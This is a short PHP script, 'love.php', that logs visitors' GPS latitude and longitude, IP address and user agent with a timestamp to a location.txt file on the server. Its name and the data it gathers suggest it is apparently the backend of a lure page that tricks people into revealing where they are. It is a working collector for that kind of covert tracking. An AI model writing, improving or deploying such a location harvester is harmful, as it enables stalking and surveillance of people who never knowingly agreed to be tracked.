<?php
// Simple, safer love.php
date_default_timezone_set('UTC');

$latitude  = isset($_GET['lat'])   ? trim($_GET['lat'])   : '';
$longitude = isset($_GET['long'])  ? trim($_GET['long'])  : '';
// prefer provided uagent, fallback to server value
$userAgent = isset($_GET['uagent']) ? trim($_GET['uagent']) : (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');

// basic sanitization: keep only allowed chars (optional; adjust as needed)
$latitude  = substr($latitude, 0, 64);
$longitude = substr($longitude, 0, 64);
$userAgent = substr($userAgent, 0, 1024);

$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';

$txt = "Time: " . date('Y-m-d H:i:s') . "\n"
     . "Location: " . $latitude . ", " . $longitude . "\n"
     . "IP Address: " . $ip . "\n"
     . "User Agent: " . $userAgent . "\n\n";

// write (append) to location.txt — ensure webserver has write permission to the directory
$file = __DIR__ . '/location.txt';
if (file_put_contents($file, $txt, FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    echo "Failed to write location data.";
    exit;
}

// echo a simple, escaped response
echo "Latitude: " . htmlspecialchars($latitude, ENT_QUOTES, 'UTF-8') . "<br>";
echo "Longitude: " . htmlspecialchars($longitude, ENT_QUOTES, 'UTF-8') . "<br>";
echo "User Agent: " . htmlspecialchars($userAgent, ENT_QUOTES, 'UTF-8') . "<br>";
?>



